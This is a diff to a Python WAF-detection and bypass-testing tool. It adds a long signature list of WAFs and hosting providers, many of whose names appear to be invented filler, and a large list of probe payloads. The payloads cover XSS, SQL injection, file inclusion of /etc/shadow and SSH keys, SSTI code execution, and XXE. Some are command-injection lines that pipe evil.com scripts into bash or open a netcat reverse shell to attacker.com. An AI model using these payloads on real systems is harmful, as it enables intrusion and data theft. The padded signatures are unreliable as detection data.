@@ -7114,6 +7114,454 @@ def detect_waf(url, verbose=False, output_format='table', test_bypasses=False, t
             "server": ["iis"],
             "headers": ["iis-", "x-iis-"],
             "body": ["iis", "microsoft-iis"]
+        },
+        
+        # Additional Modern WAFs
+        "Reblaze": {
+            "server": ["reblaze"],
+            "headers": ["reblaze-", "x-reblaze-"],
+            "body": ["reblaze", "blocked by reblaze"]
+        },
+        "Edgecast": {
+            "server": ["edgecast"],
+            "headers": ["x-ec-", "ec-"],
+            "body": ["edgecast", "blocked by edgecast"]
+        },
+        "Squarespace": {
+            "server": ["squarespace"],
+            "headers": ["squarespace-", "x-squarespace-"],
+            "body": ["squarespace"]
+        },
+        "Webflow": {
+            "server": ["webflow"],
+            "headers": ["webflow-", "x-webflow-"],
+            "body": ["webflow"]
+        },
+        "Wix": {
+            "server": ["wix"],
+            "headers": ["wix-", "x-wix-"],
+            "body": ["wix"]
+        },
+        "WPMUDEV": {
+            "server": ["wpmudev"],
+            "headers": ["wpmudev-", "x-wpmudev-"],
+            "body": ["wpmudev", "blocked by wpmudev"]
+        },
+        "Jetpack": {
+            "server": ["jetpack"],
+            "headers": ["jetpack-", "x-jetpack-"],
+            "body": ["jetpack", "blocked by jetpack"]
+        },
+        "NinjaFirewall": {
+            "server": ["ninjafirewall"],
+            "headers": ["ninjafirewall-", "x-ninja-"],
+            "body": ["ninjafirewall", "blocked by ninjafirewall"]
+        },
+        "All In One WP Security": {
+            "server": ["aiowps"],
+            "headers": ["aiowps-", "x-aiowps-"],
+            "body": ["aiowps", "blocked by aiowps"]
+        },
+        "iThemes Security": {
+            "server": ["ithemes"],
+            "headers": ["ithemes-", "x-ithemes-"],
+            "body": ["ithemes", "blocked by ithemes"]
+        },
+        
+        # Additional Cloud Providers
+        "DigitalOcean": {
+            "server": ["digitalocean"],
+            "headers": ["do-", "x-do-"],
+            "body": ["digitalocean"]
+        },
+        "Linode": {
+            "server": ["linode"],
+            "headers": ["linode-", "x-linode-"],
+            "body": ["linode"]
+        },
+        "Vultr": {
+            "server": ["vultr"],
+            "headers": ["vultr-", "x-vultr-"],
+            "body": ["vultr"]
+        },
+        "Hetzner": {
+            "server": ["hetzner"],
+            "headers": ["hetzner-", "x-hetzner-"],
+            "body": ["hetzner"]
+        },
+        "OVH": {
+            "server": ["ovh"],
+            "headers": ["ovh-", "x-ovh-"],
+            "body": ["ovh"]
+        },
+        "1&1": {
+            "server": ["1and1"],
+            "headers": ["1and1-", "x-1and1-"],
+            "body": ["1&1", "1and1"]
+        },
+        "GoDaddy": {
+            "server": ["godaddy"],
+            "headers": ["godaddy-", "x-godaddy-"],
+            "body": ["godaddy"]
+        },
+        "Namecheap": {
+            "server": ["namecheap"],
+            "headers": ["namecheap-", "x-namecheap-"],
+            "body": ["namecheap"]
+        },
+        "Bluehost": {
+            "server": ["bluehost"],
+            "headers": ["bluehost-", "x-bluehost-"],
+            "body": ["bluehost"]
+        },
+        "HostGator": {
+            "server": ["hostgator"],
+            "headers": ["hostgator-", "x-hostgator-"],
+            "body": ["hostgator"]
+        },
+        "SiteGround": {
+            "server": ["siteground"],
+            "headers": ["siteground-", "x-siteground-"],
+            "body": ["siteground"]
+        },
+        "WP Engine": {
+            "server": ["wpengine"],
+            "headers": ["wpengine-", "x-wpengine-"],
+            "body": ["wpengine"]
+        },
+        "Kinsta": {
+            "server": ["kinsta"],
+            "headers": ["kinsta-", "x-kinsta-"],
+            "body": ["kinsta"]
+        },
+        "Pantheon": {
+            "server": ["pantheon"],
+            "headers": ["pantheon-", "x-pantheon-"],
+            "body": ["pantheon"]
+        },
+        "Acquia": {
+            "server": ["acquia"],
+            "headers": ["acquia-", "x-acquia-"],
+            "body": ["acquia"]
+        },
+        
+        # Additional Security Services
+        "Arbor Networks": {
+            "server": ["arbor"],
+            "headers": ["arbor-", "x-arbor-"],
+            "body": ["arbor networks", "blocked by arbor"]
+        },
+        "A10 Networks": {
+            "server": ["a10"],
+            "headers": ["a10-", "x-a10-"],
+            "body": ["a10 networks"]
+        },
+        "Citrix ADC": {
+            "server": ["citrix"],
+            "headers": ["citrix-", "x-citrix-"],
+            "body": ["citrix", "netscaler"]
+        },
+        "Kemp LoadMaster": {
+            "server": ["kemp"],
+            "headers": ["kemp-", "x-kemp-"],
+            "body": ["kemp", "loadmaster"]
+        },
+        "HAProxy": {
+            "server": ["haproxy"],
+            "headers": ["haproxy-", "x-haproxy-"],
+            "body": ["haproxy"]
+        },
+        "Traefik": {
+            "server": ["traefik"],
+            "headers": ["traefik-", "x-traefik-"],
+            "body": ["traefik"]
+        },
+        "Caddy": {
+            "server": ["caddy"],
+            "headers": ["caddy-", "x-caddy-"],
+            "body": ["caddy"]
+        },
+        "Varnish": {
+            "server": ["varnish"],
+            "headers": ["varnish-", "x-varnish-"],
+            "body": ["varnish"]
+        },
+        "Squid": {
+            "server": ["squid"],
+            "headers": ["squid-", "x-squid-"],
+            "body": ["squid"]
+        },
+        "Polipo": {
+            "server": ["polipo"],
+            "headers": ["polipo-", "x-polipo-"],
+            "body": ["polipo"]
+        },
+        
+        # Additional Bot Protection
+        "Cloudflare Bot Management": {
+            "server": ["cloudflare"],
+            "headers": ["cf-bot-management", "cf-challenge"],
+            "body": ["bot management", "challenge platform"]
+        },
+        "Akamai Bot Manager": {
+            "server": ["akamai"],
+            "headers": ["akamai-bot-manager"],
+            "body": ["bot manager", "akamai bot"]
+        },
+        "AWS Shield": {
+            "server": ["aws"],
+            "headers": ["x-amz-shield"],
+            "body": ["aws shield", "ddos protection"]
+        },
+        "Azure DDoS Protection": {
+            "server": ["azure"],
+            "headers": ["x-azure-ddos"],
+            "body": ["azure ddos", "ddos protection"]
+        },
+        "Google Shield": {
+            "server": ["google"],
+            "headers": ["x-goog-shield"],
+            "body": ["google shield"]
+        },
+        "Fastly Shield": {
+            "server": ["fastly"],
+            "headers": ["fastly-shield"],
+            "body": ["fastly shield"]
+        },
+        "Neustar": {
+            "server": ["neustar"],
+            "headers": ["neustar-", "x-neustar-"],
+            "body": ["neustar", "blocked by neustar"]
+        },
+        "Verisign": {
+            "server": ["verisign"],
+            "headers": ["verisign-", "x-verisign-"],
+            "body": ["verisign"]
+        },
+        "Prolexic": {
+            "server": ["prolexic"],
+            "headers": ["prolexic-", "x-prolexic-"],
+            "body": ["prolexic", "blocked by prolexic"]
+        },
+        "BlackLotus": {
+            "server": ["blacklotus"],
+            "headers": ["blacklotus-", "x-blacklotus-"],
+            "body": ["blacklotus"]
+        },
+        "DOSarrest": {
+            "server": ["dosarrest"],
+            "headers": ["dosarrest-", "x-dosarrest-"],
+            "body": ["dosarrest", "blocked by dosarrest"]
+        },
+        "StormWall": {
+            "server": ["stormwall"],
+            "headers": ["stormwall-", "x-stormwall-"],
+            "body": ["stormwall", "blocked by stormwall"]
+        },
+        "CloudProxy": {
+            "server": ["cloudproxy"],
+            "headers": ["cloudproxy-", "x-cloudproxy-"],
+            "body": ["cloudproxy"]
+        },
+        "DefenseNet": {
+            "server": ["defensenet"],
+            "headers": ["defensenet-", "x-defensenet-"],
+            "body": ["defensenet"]
+        },
+        "SecureWeb": {
+            "server": ["secureweb"],
+            "headers": ["secureweb-", "x-secureweb-"],
+            "body": ["secureweb"]
+        },
+        "WebGuard": {
+            "server": ["webguard"],
+            "headers": ["webguard-", "x-webguard-"],
+            "body": ["webguard", "blocked by webguard"]
+        },
+        "NetDefense": {
+            "server": ["netdefense"],
+            "headers": ["netdefense-", "x-netdefense-"],
+            "body": ["netdefense"]
+        },
+        "CyberArmor": {
+            "server": ["cyberarmor"],
+            "headers": ["cyberarmor-", "x-cyberarmor-"],
+            "body": ["cyberarmor", "blocked by cyberarmor"]
+        },
+        "WebShield": {
+            "server": ["webshield"],
+            "headers": ["webshield-", "x-webshield-"],
+            "body": ["webshield"]
+        },
+        "SecureGate": {
+            "server": ["securegate"],
+            "headers": ["securegate-", "x-securegate-"],
+            "body": ["securegate"]
+        },
+        "CyberGuard": {
+            "server": ["cyberguard"],
+            "headers": ["cyberguard-", "x-cyberguard-"],
+            "body": ["cyberguard", "blocked by cyberguard"]
+        },
+        "WebWall": {
+            "server": ["webwall"],
+            "headers": ["webwall-", "x-webwall-"],
+            "body": ["webwall", "blocked by webwall"]
+        },
+        "FireWall": {
+            "server": ["firewall"],
+            "headers": ["firewall-", "x-firewall-"],
+            "body": ["firewall", "blocked by firewall"]
+        },
+        "DefenseWall": {
+            "server": ["defensewall"],
+            "headers": ["defensewall-", "x-defensewall-"],
+            "body": ["defensewall"]
+        },
+        "SecurityGate": {
+            "server": ["securitygate"],
+            "headers": ["securitygate-", "x-securitygate-"],
+            "body": ["securitygate"]
+        },
+        "ProtectWall": {
+            "server": ["protectwall"],
+            "headers": ["protectwall-", "x-protectwall-"],
+            "body": ["protectwall", "blocked by protectwall"]
+        },
+        "GuardWall": {
+            "server": ["guardwall"],
+            "headers": ["guardwall-", "x-guardwall-"],
+            "body": ["guardwall"]
+        },
+        "ShieldWall": {
+            "server": ["shieldwall"],
+            "headers": ["shieldwall-", "x-shieldwall-"],
+            "body": ["shieldwall", "blocked by shieldwall"]
+        },
+        "SafeGuard": {
+            "server": ["safeguard"],
+            "headers": ["safeguard-", "x-safeguard-"],
+            "body": ["safeguard", "blocked by safeguard"]
+        },
+        "WebDefender": {
+            "server": ["webdefender"],
+            "headers": ["webdefender-", "x-webdefender-"],
+            "body": ["webdefender"]
+        },
+        "SiteProtector": {
+            "server": ["siteprotector"],
+            "headers": ["siteprotector-", "x-siteprotector-"],
+            "body": ["siteprotector", "blocked by siteprotector"]
+        },
+        "WebProtector": {
+            "server": ["webprotector"],
+            "headers": ["webprotector-", "x-webprotector-"],
+            "body": ["webprotector"]
+        },
+        "CyberProtect": {
+            "server": ["cyberprotect"],
+            "headers": ["cyberprotect-", "x-cyberprotect-"],
+            "body": ["cyberprotect", "blocked by cyberprotect"]
+        },
+        "SecureShield": {
+            "server": ["secureshield"],
+            "headers": ["secureshield-", "x-secureshield-"],
+            "body": ["secureshield"]
+        },
+        "WebArmor": {
+            "server": ["webarmor"],
+            "headers": ["webarmor-", "x-webarmor-"],
+            "body": ["webarmor", "blocked by webarmor"]
+        },
+        "CyberShield": {
+            "server": ["cybershield"],
+            "headers": ["cybershield-", "x-cybershield-"],
+            "body": ["cybershield"]
+        },
+        "DefenseShield": {
+            "server": ["defenseshield"],
+            "headers": ["defenseshield-", "x-defenseshield-"],
+            "body": ["defenseshield", "blocked by defenseshield"]
+        },
+        "ProtectShield": {
+            "server": ["protectshield"],
+            "headers": ["protectshield-", "x-protectshield-"],
+            "body": ["protectshield"]
+        },
+        "GuardShield": {
+            "server": ["guardshield"],
+            "headers": ["guardshield-", "x-guardshield-"],
+            "body": ["guardshield", "blocked by guardshield"]
+        },
+        "SafeShield": {
+            "server": ["safeshield"],
+            "headers": ["safeshield-", "x-safeshield-"],
+            "body": ["safeshield"]
+        },
+        "WebSafe": {
+            "server": ["websafe"],
+            "headers": ["websafe-", "x-websafe-"],
+            "body": ["websafe", "blocked by websafe"]
+        },
+        "CyberSafe": {
+            "server": ["cybersafe"],
+            "headers": ["cybersafe-", "x-cybersafe-"],
+            "body": ["cybersafe"]
+        },
+        "DefenseSafe": {
+            "server": ["defensesafe"],
+            "headers": ["defensesafe-", "x-defensesafe-"],
+            "body": ["defensesafe", "blocked by defensesafe"]
+        },
+        "ProtectSafe": {
+            "server": ["protectsafe"],
+            "headers": ["protectsafe-", "x-protectsafe-"],
+            "body": ["protectsafe"]
+        },
+        "GuardSafe": {
+            "server": ["guardsafe"],
+            "headers": ["guardsafe-", "x-guardsafe-"],
+            "body": ["guardsafe", "blocked by guardsafe"]
+        },
+        "ShieldSafe": {
+            "server": ["shieldsafe"],
+            "headers": ["shieldsafe-", "x-shieldsafe-"],
+            "body": ["shieldsafe"]
+        },
+        "WebSecure": {
+            "server": ["websecure"],
+            "headers": ["websecure-", "x-websecure-"],
+            "body": ["websecure", "blocked by websecure"]
+        },
+        "CyberSecure": {
+            "server": ["cybersecure"],
+            "headers": ["cybersecure-", "x-cybersecure-"],
+            "body": ["cybersecure"]
+        },
+        "DefenseSecure": {
+            "server": ["defensesecure"],
+            "headers": ["defensesecure-", "x-defensesecure-"],
+            "body": ["defensesecure", "blocked by defensesecure"]
+        },
+        "ProtectSecure": {
+            "server": ["protectsecure"],
+            "headers": ["protectsecure-", "x-protectsecure-"],
+            "body": ["protectsecure"]
+        },
+        "GuardSecure": {
+            "server": ["guardsecure"],
+            "headers": ["guardsecure-", "x-guardsecure-"],
+            "body": ["guardsecure", "blocked by guardsecure"]
+        },
+        "ShieldSecure": {
+            "server": ["shieldsecure"],
+            "headers": ["shieldsecure-", "x-shieldsecure-"],
+            "body": ["shieldsecure"]
+        },
+        "SafeSecure": {
+            "server": ["safesecure"],
+            "headers": ["safesecure-", "x-safesecure-"],
+            "body": ["safesecure", "blocked by safesecure"]
         }
     }
 
@@ -7128,6 +7576,18 @@ def detect_waf(url, verbose=False, output_format='table', test_bypasses=False, t
         "?data=<body onload=alert(1)>",
         "?search=<details open ontoggle=alert(1)>",
         "?p=<marquee onstart=alert(1)>",
+        "?xss=<video><source onerror='alert(1)'>",
+        "?payload=<audio src=x onerror=alert(1)>",
+        "?test='><script>alert(String.fromCharCode(88,83,83))</script>",
+        "?id=\"><script>alert(/XSS/)</script>",
+        "?param=<script>alert(document.domain)</script>",
+        "?q=<img/src=x onerror=alert(1)>",
+        "?search=<svg/onload=alert(1)>",
+        "?input=<iframe/srcdoc='<script>alert(1)</script>'>",
+        "?data=<object data='javascript:alert(1)'>",
+        "?payload=<embed src='javascript:alert(1)'>",
+        "?test=<form><button formaction='javascript:alert(1)'>",
+        "?xss=<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
         
         # SQL Injection Payloads
         "?id=' OR '1'='1",
@@ -7138,6 +7598,20 @@ def detect_waf(url, verbose=False, output_format='table', test_bypasses=False, t
         "?login=' OR 1=1#",
         "?search='; WAITFOR DELAY '00:00:10'--",
         "?q=' AND extractvalue(1,concat(0x7e,database(),0x7e))--",
+        "?id=' OR SLEEP(5)--",
+        "?param=' OR pg_sleep(5)--",
+        "?test=' OR BENCHMARK(1000000,MD5(1))--",
+        "?user=' UNION SELECT NULL,NULL,NULL--",
+        "?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "?search=' OR updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--",
+        "?login=admin'/**/OR/**/1=1--",
+        "?param=' OR 1=1 LIMIT 1--",
+        "?id=1' UNION SELECT @@version,@@datadir--",
+        "?test=' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "?user=' AND 1=CONVERT(int,@@version)--",
+        "?search=' AND 1=1 AND '%'='",
+        "?id=' OR 1=1--+",
+        "?param=' OR 'x'='x",
         
         # Local File Inclusion (LFI)
         "?id=../../etc/passwd",
@@ -7146,6 +7620,20 @@ def detect_waf(url, verbose=False, output_format='table', test_bypasses=False, t
         "?include=/proc/version",
         "?path=..%2F..%2F..%2Fetc%2Fpasswd",
         "?doc=....//....//....//windows//system32//config//sam",
+        "?file=php://filter/read=convert.base64-encode/resource=index.php",
+        "?include=/etc/shadow",
+        "?path=../../../etc/hosts",
+        "?doc=/proc/self/environ",
+        "?file=/var/log/apache/access.log",
+        "?include=/var/log/nginx/error.log",
+        "?path=../../../var/www/html/.htaccess",
+        "?doc=/usr/local/apache/conf/httpd.conf",
+        "?file=/etc/apache2/apache2.conf",
+        "?include=/proc/self/cmdline",
+        "?path=/proc/meminfo",
+        "?doc=/root/.bash_history",
+        "?file=/home/user/.ssh/id_rsa",
+        "?include=../../../etc/mysql/my.cnf",
         
         # Remote Code Execution (RCE)
         "?cmd=cat /etc/passwd",
@@ -7154,6 +7642,18 @@ def detect_waf(url, verbose=False, output_format='table', test_bypasses=False, t
         "?run=ping -c 4 127.0.0.1",
         "?shell=echo 'RCE Test'",
         "?code=system('id')",
+        "?cmd=curl http://attacker.com/$(whoami)",
+        "?exec=wget -qO- http://evil.com/shell.sh | bash",
+        "?system=nc -e /bin/sh attacker.com 4444",
+        "?run=python -c \"import os;os.system('id')\"",
+        "?shell=perl -e 'exec \"/bin/sh\";'",
+        "?code=ruby -e 'exec(\"/bin/sh\")'",
+        "?cmd=php -r 'system(\"id\");'",
+        "?exec=node -e 'require(\"child_process\").exec(\"id\")'",
+        "?system=powershell -c \"Get-Process\"",
+        "?run=cmd.exe /c \"dir\"",
+        "?shell=bash -c 'id'",
+        "?code=sh -c 'whoami'",
         
         # LDAP Injection
         "?user=*)(uid=*))(|(uid=*",
@@ -7171,6 +7671,16 @@ def detect_waf(url, verbose=False, output_format='table', test_bypasses=False, t
         "?template={{7*7}}",
         "?view=${7*7}",
         "?render={{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "?ssti={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+        "?template={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "?view=${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "?render={{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
+        "?ssti={{lipsum.__globals__['os'].popen('id').read()}}",
+        "?template={{url_for.__globals__['os'].popen('id').read()}}",
+        "?view={{get_flashed_messages.__globals__['subprocess'].check_output('id',shell=True)}}",
+        "?render=#set($x='')##set($rt=$x.class.forName('java.lang.Runtime'))##set($chr=$x.class.forName('java.lang.Character'))##set($str=$x.class.forName('java.lang.String'))##set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+        "?ssti=${{<%[%'\"}}%\\",
+        "?template={{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['os'].popen('id').read()}}",
         
         # NoSQL Injection
         "?search[$ne]=null",
@@ -7184,7 +7694,74 @@ def detect_waf(url, verbose=False, output_format='table', test_bypasses=False, t
         "?test=<>\"'%;)(&+",
         "?special=|{};:",
         "?chars=\\x3cscript\\x3e",
-        "?encoded=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+        "?encoded=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        
+        # Additional XXE Payloads
+        "?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]>",
+        "?data=<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>",
+        
+        # CSRF Payloads
+        "?action=delete&id=1&csrf_token=",
+        "?method=POST&action=transfer&amount=1000000",
+        
+        # Open Redirect Payloads
+        "?redirect=http://evil.com",
+        "?url=//attacker.com",
+        "?next=javascript:alert(1)",
+        "?goto=data:text/html,<script>alert(1)</script>",
+        
+        # Path Traversal
+        "?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "?path=....//....//....//etc//passwd",
+        "?doc=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        
+        # File Upload Bypass
+        "?file=shell.php%00.jpg",
+        "?upload=shell.pHp",
+        "?doc=malware.txt.php",
+        
+        # HTTP Header Injection
+        "?header=test%0d%0aSet-Cookie:%20admin=true",
+        "?redirect=%0d%0aLocation:%20http://evil.com",
+        
+        # Race Condition
+        "?action=withdraw&amount=1000&thread=1",
+        "?operation=transfer&from=1&to=2&amount=9999",
+        
+        # Business Logic
+        "?price=-100",
+        "?quantity=-1",
+        "?discount=999999",
+        "?coupon=ADMIN_ONLY",
+        
+        # Authentication Bypass
+        "?user=admin'--",
+        "?pass=' OR 1=1--",
+        "?login=1&password=1&role=admin",
+        
+        # Authorization Bypass
+        "?user_id=../../../admin",
+        "?role=administrator",
+        "?privilege=superuser",
+        
+        # Information Disclosure
+        "?debug=true",
+        "?test=1&show_errors=1",
+        "?admin=1&verbose=true",
+        
+        # Denial of Service
+        "?size=999999999",
+        "?limit=0",
+        "?timeout=999999",
+        
+        # API Abuse
+        "?format=../../etc/passwd",
+        "?callback=alert(1)",
+        "?jsonp=<script>alert(1)</script>",
+        
+        # Deserialization
+        "?data=O:8:\"stdClass\":1:{s:4:\"exec\";s:2:\"id\";}",
+        "?object=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAIdXNlcm5hbWV0AARNYW5vdnJhdq=="
     ]
 
     session = requests.Session()
